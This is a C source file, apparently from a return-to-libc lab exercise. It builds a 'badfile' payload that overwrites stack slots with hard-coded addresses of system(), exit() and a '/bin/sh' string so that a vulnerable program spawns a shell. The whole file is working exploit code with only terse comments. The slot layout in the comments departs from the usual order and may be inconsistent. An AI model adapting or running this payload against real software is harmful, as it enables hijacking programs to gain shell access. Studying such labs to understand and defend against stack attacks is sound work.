/* exploit.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define SHELL_LOC 0xbfffff65
#define SYSTEM_LOC 0xb7da4da0
#define EXIT_LOC 0xb7d989d0
#define EBP 72
int main(int argc, char **argv)
{
	int offset = atoi(argv[1]);
	char buf[300];
	FILE *badfile;
	badfile = fopen("./badfile", "w");
	/* /bin/sh has to be input for system()
	   has to be in $ebp + 4 */
	*(long *) &buf[72+4] = SHELL_LOC + offset; // "/bin/sh" ✰
	printf("%x \n", (SHELL_LOC) + offset); 
	/* system() has to overwrite return address
	   $ebp + 12 */
	*(long *) &buf[72+12] = SYSTEM_LOC ; // system() ✰
	/* exit must go in $ebp + 8 */
	*(long *) &buf[72+8] = EXIT_LOC ; // exit() ✰
	fwrite(buf, sizeof(buf), 1, badfile);
	fclose(badfile);
}
